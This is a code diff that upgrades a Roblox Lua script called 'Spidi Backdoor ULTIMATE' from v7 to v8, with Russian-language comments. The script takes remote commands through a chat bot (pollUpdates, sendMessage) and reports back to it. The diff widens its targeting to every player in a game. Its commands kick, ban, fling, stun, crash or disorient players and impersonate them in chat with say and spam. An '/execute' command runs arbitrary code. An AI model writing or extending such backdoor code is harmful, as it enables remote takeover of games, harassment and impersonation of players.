@@ -8,7 +8,7 @@
 ]=]
 
 print("[Spidi] ========================================")
-print("[Spidi] 🚀 Spidi Backdoor ULTIMATE v7")
+print("[Spidi] 🚀 Spidi Backdoor ULTIMATE v8")
 print("[Spidi] ========================================")
 
 repeat wait() until game:IsLoaded()
@@ -58,10 +58,62 @@ local function getChatId()
     return false
 end
 
--- ==================== СПИСОК ИГРОКОВ СКРИПТА ====================
+-- ==================== БАЗА ИГРОКОВ С НУМЕРАЦИЕЙ ====================
+local playerDB = {}
 local scriptUsers = {}
-local selectedPlayer = nil
 
+local function updatePlayerDB()
+    playerDB = {}
+    local i = 1
+    for _, p in pairs(Players:GetPlayers()) do
+        playerDB[i] = p
+        playerDB[p.Name:lower()] = p
+        playerDB[p.DisplayName:lower()] = p
+        i = i + 1
+    end
+end
+
+local function findPlayer(input)
+    if not input or input == "" then return nil, "❌ Введи ник или номер" end
+    
+    updatePlayerDB()
+    
+    local num = tonumber(input)
+    if num and playerDB[num] then
+        return playerDB[num]
+    end
+    
+    input = input:lower()
+    if playerDB[input] then
+        return playerDB[input]
+    end
+    
+    local matches = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
+            table.insert(matches, p)
+        end
+    end
+    if #matches == 1 then return matches[1]
+    elseif #matches > 1 then
+        local names = {}
+        for _, p in pairs(matches) do table.insert(names, p.Name) end
+        return nil, "Найдено несколько: "..table.concat(names, ", ")
+    else return nil, "Игрок не найден" end
+end
+
+local function getPlayerList()
+    local list = {}
+    local i = 1
+    for _, p in pairs(Players:GetPlayers()) do
+        local isScript = scriptUsers[p.UserId] and " 🔥" or ""
+        table.insert(list, i..". "..p.Name..isScript)
+        i = i + 1
+    end
+    return list
+end
+
+-- ==================== ДОБАВЛЕНИЕ ПОЛЬЗОВАТЕЛЕЙ СКРИПТА ====================
 local function addScriptUser(player)
     if not scriptUsers[player.UserId] then
         scriptUsers[player.UserId] = player
@@ -72,7 +124,6 @@ end
 local function removeScriptUser(player)
     if scriptUsers[player.UserId] then
         scriptUsers[player.UserId] = nil
-        if selectedPlayer == player then selectedPlayer = nil end
         sendMessage("🔴 <b>"..player.Name.."</b> отключился от Spidi Backdoor!")
     end
 end
@@ -82,37 +133,6 @@ addScriptUser(Players.LocalPlayer)
 local marker = Instance.new("BoolValue")
 marker.Name = "SpidiUser"
 marker.Parent = Players.LocalPlayer
-
--- ==================== ПОИСК ИГРОКА ====================
-local function findPlayer(input)
-    if not input or input == "" then return nil, "❌ Введи ник или номер" end
-    
-    local users = {}
-    for _, p in pairs(Players:GetPlayers()) do
-        if scriptUsers[p.UserId] then
-            table.insert(users, p)
-        end
-    end
-    
-    local num = tonumber(input)
-    if num and users[num] then
-        return users[num]
-    end
-    
-    input = input:lower()
-    local matches = {}
-    for _, p in pairs(users) do
-        if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
-            table.insert(matches, p)
-        end
-    end
-    if #matches == 1 then return matches[1]
-    elseif #matches > 1 then
-        local names = {}
-        for _, p in pairs(matches) do table.insert(names, p.Name) end
-        return nil, "Найдено несколько: "..table.concat(names, ", ")
-    else return nil, "Игрок не найден (скрипт не активен)" end
-end
 
 -- ==================== КД НА СООБЩЕНИЯ ====================
 local messageCooldown = {}
@@ -126,18 +146,14 @@ local function canSendMessage(player)
     return true
 end
 
--- ==================== ФУНКЦИЯ DES ====================
+-- ==================== ФУНКЦИИ ====================
 local function desorientPlayer(target)
     local char = target.Character
     if not char then return end
-    local hum = char:FindFirstChild("Humanoid")
-    if not hum then return end
-    
     local camera = Workspace.CurrentCamera
     if not camera then return end
     
     camera.CameraType = Enum.CameraType.Scriptable
-    
     local startTime = tick()
     local connection
     
@@ -155,7 +171,6 @@ local function desorientPlayer(target)
     end)
 end
 
--- ==================== ФУНКЦИЯ SETFPS ====================
 local isFpsCapped = false
 local function toggleFps()
     isFpsCapped = not isFpsCapped
@@ -163,21 +178,13 @@ local function toggleFps()
     return isFpsCapped
 end
 
--- ==================== ФУНКЦИЯ SAY (ОТ ИГРОКА) ====================
 local function sayMessage(target, msg)
     if not target then return end
-    -- Пытаемся отправить от имени игрока через его клиент
-    local char = target.Character
-    if not char then return end
-    
-    -- Для новой системы чата
     local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
     if chatChannel then
         chatChannel:SendAsync(msg)
         return
     end
-    
-    -- Для старой системы чата
     local legacyRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
     if legacyRemote then
         local say = legacyRemote:FindFirstChild("SayMessageRequest")
@@ -185,7 +192,6 @@ local function sayMessage(target, msg)
     end
 end
 
--- ==================== ФУНКЦИЯ STUN ====================
 local stunnedPlayers = {}
 local function stunPlayer(target)
     local char = target.Character
@@ -198,10 +204,7 @@ local function stunPlayer(target)
     hum.WalkSpeed = 0
     hum.JumpPower = 0
     
-    stunnedPlayers[target.UserId] = {
-        speed = origSpeed,
-        jump = origJump
-    }
+    stunnedPlayers[target.UserId] = { speed = origSpeed, jump = origJump }
     
     task.delay(3, function()
         if stunnedPlayers[target.UserId] then
@@ -216,7 +219,6 @@ local function stunPlayer(target)
     end)
 end
 
--- ==================== ФУНКЦИЯ FLING ====================
 local function flingPlayer(target)
     local char = target.Character
     if not char then return end
@@ -225,10 +227,8 @@ local function flingPlayer(target)
     if not (hrp and hum) then return end
 
     hum.Sit = true
-
     local dirX = math.random() > 0.5 and 1 or -1
     local dirZ = math.random() > 0.5 and 1 or -1
-
     hrp.AssemblyLinearVelocity = Vector3.new(
         math.random(200, 400) * dirX,
         math.random(300, 500),
@@ -236,7 +236,6 @@ local function flingPlayer(target)
     )
 end
 
--- ==================== ФУНКЦИЯ SPIN ====================
 local spinningPlayers = {}
 local function spinPlayer(target, speed)
     speed = speed or 1
@@ -290,16 +289,14 @@ local function handleCommand(cmd, args, username)
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
-        sendMessage("✅ Spidi Backdoor ULTIMATE v7 активирован!\n"..info)
+        sendMessage("✅ Spidi Backdoor ULTIMATE v8 активирован!\n"..info)
         return
     end
     
     if cmd == "help" then
-        sendMessage("📋 <b>КОМАНДЫ SPIDI v7:</b>\n\n"..
-            "<b>👤 ИГРОКИ:</b>\n"..
-            "/sp - показать список пользователей\n"..
-            "/sp [ник/номер] - выбрать игрока\n"..
-            "/players - список пользователей\n"..
+        sendMessage("📋 <b>КОМАНДЫ SPIDI v8:</b>\n\n"..
+            "<b>👤 ИГРОКИ (все команды с выбором игрока):</b>\n"..
+            "/players - список всех игроков\n"..
             "/kick [ник/номер] - кикнуть\n"..
             "/ban [ник/номер] - забанить\n"..
             "/unban [ник/номер] - разбанить\n"..
@@ -319,65 +316,28 @@ local function handleCommand(cmd, args, username)
             "/unspin [ник/номер] - остановить вращение\n"..
             "/explode [ник/номер] - взорвать\n"..
             "/des [ник/номер] - дезориентация камеры (3 сек)\n"..
-            "/setfps - ограничить FPS до 10 (toggle)\n"..
             "/warp [ник/номер] [1-10] - размыть экран\n"..
             "/unwarp [ник/номер] - убрать размытие\n\n"..
-            "<b>💬 ЧАТ (от имени выбранного игрока):</b>\n"..
-            "/say [текст] - сказать в чат\n"..
-            "/spam [кол-во] [текст] - спам\n"..
-            "/message [ник/номер] [текст] - сообщение\n\n"..
+            "<b>💬 ЧАТ (с выбором игрока):</b>\n"..
+            "/say [ник/номер] [текст] - сказать в чат от имени игрока\n"..
+            "/spam [ник/номер] [кол-во] [текст] - спам от имени игрока\n"..
+            "/message [ник/номер] [текст] - отправить сообщение\n\n"..
             "<b>📊 ИНФО:</b>\n"..
-            "/players - список пользователей\n"..
+            "/players - список всех игроков\n"..
             "/server - инфо о сервере\n"..
             "/rejoin - перезайти\n"..
             "/execute [код] - выполнить код\n"..
+            "/setfps - ограничить FPS до 10 (toggle)\n"..
             "/help - помощь")
         return
     end
     
-    if cmd == "sp" then
-        local input = args[1]
-        if not input then
-            local list = {}
-            local i = 1
-            for _, p in pairs(Players:GetPlayers()) do
-                if scriptUsers[p.UserId] then
-                    local sel = (selectedPlayer and selectedPlayer.UserId == p.UserId) and " ✅ ВЫБРАН" or ""
-                    table.insert(list, i..". "..p.Name..sel)
-                    i = i + 1
-                end
-            end
-            if #list == 0 then
-                sendMessage("👥 Пользователей скрипта: 0")
-            else
-                sendMessage("👥 <b>Пользователи скрипта:</b>\n"..table.concat(list, "\n").."\n\n/sp [номер] - выбрать игрока")
-            end
-            return
-        end
-        local target, err = findPlayer(input)
-        if not target then
-            sendMessage("❌ "..err)
-            return
-        end
-        selectedPlayer = target
-        sendMessage("✅ Выбран: <b>"..target.Name.."</b> (ID: "..target.UserId..")")
-        return
-    end
-    
     if cmd == "players" then
-        local list = {}
-        local i = 1
-        for _, p in pairs(Players:GetPlayers()) do
-            if scriptUsers[p.UserId] then
-                local sel = (selectedPlayer and selectedPlayer.UserId == p.UserId) and " ✅ ВЫБРАН" or ""
-                table.insert(list, i..". "..p.Name..sel)
-                i = i + 1
-            end
-        end
+        local list = getPlayerList()
         if #list == 0 then
-            sendMessage("👥 Пользователей скрипта: 0")
+            sendMessage("👥 Игроков: 0")
         else
-            sendMessage("👥 Пользователей: "..#list.."\n"..table.concat(list, "\n"))
+            sendMessage("👥 <b>Все игроки:</b>\n"..table.concat(list, "\n").."\n\n🔥 - использует Spidi Backdoor")
         end
         return
     end
@@ -413,48 +373,92 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    -- ========== КОМАНДЫ ДЛЯ ИГРОКОВ ==========
+    -- ========== КОМАНДЫ С ВЫБОРОМ ИГРОКА ==========
     
-    -- /say и /spam работают от выбранного игрока
+    -- /say [ник] [текст]
     if cmd == "say" then
-        if not selectedPlayer then
-            sendMessage("❌ Сначала выбери игрока через /sp")
+        local name = args[1]
+        local msg = table.concat(args, " ", 2)
+        if not name then
+            sendMessage("❌ /say [ник/номер] [текст]")
             return
         end
-        local msg = table.concat(args, " ", 1)
-        if msg == "" then sendMessage("❌ /say текст") return end
-        sayMessage(selectedPlayer, msg)
-        sendMessage("✅ Сказано от имени <b>"..selectedPlayer.Name.."</b>: "..msg)
+        if msg == "" then
+            sendMessage("❌ Введи текст: /say ник текст")
+            return
+        end
+        local target, err = findPlayer(name)
+        if not target then
+            sendMessage("❌ "..err)
+            return
+        end
+        sayMessage(target, msg)
+        sendMessage("✅ Сказано от имени <b>"..target.Name.."</b>: "..msg)
         return
     end
     
+    -- /spam [ник] [кол-во] [текст]
     if cmd == "spam" then
-        if not selectedPlayer then
-            sendMessage("❌ Сначала выбери игрока через /sp")
+        local name = args[1]
+        local count = tonumber(args[2]) or 5
+        local msg = table.concat(args, " ", 3)
+        if not name then
+            sendMessage("❌ /spam [ник/номер] [кол-во] [текст]")
             return
         end
-        local count = tonumber(args[1]) or 5
-        local msg = table.concat(args, " ", 2)
-        if msg == "" then sendMessage("❌ /spam кол-во текст") return end
+        if msg == "" then
+            sendMessage("❌ Введи текст: /spam ник кол-во текст")
+            return
+        end
+        local target, err = findPlayer(name)
+        if not target then
+            sendMessage("❌ "..err)
+            return
+        end
         for i = 1, math.min(count, 20) do
             task.wait(0.1)
-            sayMessage(selectedPlayer, msg.." "..i)
+            sayMessage(target, msg.." "..i)
         end
-        sendMessage("✅ Спам отправлен от имени <b>"..selectedPlayer.Name.."</b> ("..math.min(count, 20).." раз)")
+        sendMessage("✅ Спам отправлен от имени <b>"..target.Name.."</b> ("..math.min(count, 20).." раз)")
         return
     end
     
-    -- Остальные команды требуют target
-    local input = args[1]
-    local target = nil
-    local err = nil
+    -- /message [ник] [текст]
+    if cmd == "message" then
+        local name = args[1]
+        local msg = table.concat(args, " ", 2)
+        if not name then
+            sendMessage("❌ /message [ник/номер] [текст]")
+            return
+        end
+        if msg == "" then
+            sendMessage("❌ Введи текст: /message ник текст")
+            return
+        end
+        local target, err = findPlayer(name)
+        if not target then
+            sendMessage("❌ "..err)
+            return
+        end
+        if not canSendMessage(target) then
+            sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
+            return
+        end
+        StarterGui:SetCore("SendNotification", {
+            Title = "📩 Сообщение от Spidi",
+            Text = msg,
+            Duration = 6
+        })
+        sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
+        return
+    end
     
-    -- /teleport и /bring имеют 2 аргумента
+    -- /teleport [ник1] [ник2]
     if cmd == "teleport" or cmd == "bring" then
         local name1 = args[1]
         local name2 = args[2]
         if not name1 or not name2 then
-            sendMessage("❌ /"..cmd.." [ник1] [ник2]")
+            sendMessage("❌ /"..cmd.." [ник1/номер1] [ник2/номер2]")
             return
         end
         local target1, err1 = findPlayer(name1)
@@ -479,55 +483,29 @@ local function handleCommand(cmd, args, username)
         if cmd == "teleport" then
             hrp1.CFrame = hrp2.CFrame + Vector3.new(0, 3, 0)
             sendMessage("📍 <b>"..target1.Name.."</b> телепортирован к <b>"..target2.Name.."</b>")
-        else -- bring
+        else
             hrp2.CFrame = hrp1.CFrame + Vector3.new(0, 3, 0)
             sendMessage("📍 <b>"..target2.Name.."</b> притянут к <b>"..target1.Name.."</b>")
         end
         return
     end
     
-    -- Обычные команды с одним аргументом
-    if not input and selectedPlayer then
-        target = selectedPlayer
-    elseif input then
-        target, err = findPlayer(input)
-        if not target then
-            sendMessage("❌ "..err)
-            return
-        end
-    else
-        sendMessage("❌ Укажи ник/номер или выбери игрока через /sp")
+    -- Обычные команды с одним игроком
+    local name = args[1]
+    if not name then
+        sendMessage("❌ Укажи ник или номер игрока")
+        return
+    end
+    
+    local target, err = findPlayer(name)
+    if not target then
+        sendMessage("❌ "..err)
         return
     end
     
     local char = target.Character
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
     local humanoid = char and char:FindFirstChild("Humanoid")
-    
-    if cmd == "message" then
-        if not canSendMessage(target) then
-            sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
-            return
-        end
-        local msg = table.concat(args, " ", 2)
-        if msg == "" or msg == input then
-            sendMessage("❌ Введи текст: /message ник текст")
-            return
-        end
-        StarterGui:SetCore("SendNotification", {
-            Title = "📩 Сообщение от Spidi",
-            Text = msg,
-            Duration = 6
-        })
-        sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
-        return
-    end
-    
-    if cmd == "fling" then
-        flingPlayer(target)
-        sendMessage("🌀 Флинг на <b>"..target.Name.."</b>")
-        return
-    end
     
     if cmd == "kick" then
         target:Kick("Kicked by Spidi Backdoor")
@@ -610,6 +588,12 @@ local function handleCommand(cmd, args, username)
             Debris:AddItem(p, 2)
         end
         sendMessage("💥 Крашнут: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "fling" then
+        flingPlayer(target)
+        sendMessage("🌀 Флинг на <b>"..target.Name.."</b>")
         return
     end
     
@@ -723,8 +707,8 @@ local function checkNewPlayers()
             if success and hasScript then
                 addScriptUser(p)
             end
+            oldPlayers[p.UserId] = true
         end
-        oldPlayers[p.UserId] = true
     end
 end
 
@@ -747,7 +731,7 @@ local function pollUpdates()
                     local msg = update.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        sendMessage("✅ Spidi Backdoor ULTIMATE v7 запущен!\n👤 Hacker228")
+                        sendMessage("✅ Spidi Backdoor ULTIMATE v8 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -815,7 +799,7 @@ local function createGUI()
     title.BackgroundTransparency = 1
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
-    title.Text = "Spidi Backdoor ULTIMATE v7"
+    title.Text = "Spidi Backdoor ULTIMATE v8"
     title.TextColor3 = Color3.fromRGB(0, 255, 0)
     title.TextSize = 28
     title.Font = Enum.Font.GothamBold
@@ -826,7 +810,7 @@ local function createGUI()
     desc.BackgroundTransparency = 1
     desc.Size = UDim2.new(1, -40, 0, 80)
     desc.Position = UDim2.new(0, 20, 0, 70)
-    desc.Text = "Spidi Backdoor Active!\n/sp - выбрать игрока"
+    desc.Text = "Spidi Backdoor Active!\n/players - список всех игроков"
     desc.TextColor3 = Color3.fromRGB(0, 255, 0)
     desc.TextSize = 18
     desc.Font = Enum.Font.GothamBold
@@ -903,11 +887,11 @@ wait(3)
 getChatId()
 
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor ULTIMATE v7 запущен!\n👤 Hacker228\n📋 /sp - выбрать игрока, /help - все команды")
+    sendMessage("✅ Spidi Backdoor ULTIMATE v8 запущен!\n👤 Hacker228\n📋 /players - список всех игроков\n📋 /help - все команды")
 end
 
 print("[Spidi] ========================================")
 print("[Spidi] ✅ СКРИПТ ЗАПУЩЕН!")
-print("[Spidi] 📌 /sp - список пользователей и выбор")
+print("[Spidi] 📌 /players - список всех игроков")
 print("[Spidi] 📌 /help - все команды")
 print("[Spidi] ========================================")
